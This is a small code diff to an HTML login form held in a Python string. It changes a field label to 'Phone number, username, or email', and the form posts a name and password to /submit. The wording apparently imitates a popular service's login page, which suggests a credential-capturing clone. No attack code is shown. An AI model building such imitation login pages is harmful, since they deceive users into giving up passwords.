@@ -186,7 +186,7 @@ html_code = """
         <form class="login-form" action="/submit" method="post">
             <div class="field">
                 <input type="text" id="name" name="name" placeholder="Phone number, username, or email" />
-                <label for="name">Name</label>
+                <label for="name">Phone number, username, or email</label>
             </div>
             <div class="field">
                 <input  id="password" name="password" type="password" placeholder="password" />
